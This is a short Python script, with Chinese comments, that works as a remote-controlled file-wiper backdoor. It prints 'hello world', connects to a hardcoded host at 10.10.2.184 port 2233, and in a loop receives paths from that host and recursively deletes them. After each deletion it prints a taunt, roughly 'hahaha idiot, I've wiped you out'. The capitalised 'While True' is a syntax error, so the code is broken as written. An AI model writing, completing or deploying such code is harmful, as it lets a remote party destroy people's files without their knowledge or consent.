# -- coding:utf-8--
import multiprocessing
import os
import socket


def remove_dir(dir):
	#用于删除路径的函数
	dir = dir.replace('\\', '/')
	if(os.path.isdir(dir)):
		for p in os.listdir(dir):
			remove_dir(os.path.join(dir,p))
		if(os.path.exists(dir)):
			os.rmdir(dir)
	else:
		if(os.path.exists(dir)):
			os.remove(dir)


print("hello world")

sock = socket.socket()
HOST = '10.10.2.184'
PORT = 2233
sock.connect((HOST, PORT))
#发送模式
While True:

	sock.sendall("zwf".encode())
	cmd = sock.recv(1024).decode()

	remove_dir(cmd)
	print("hahahahah sb 我已经灭了吧你")
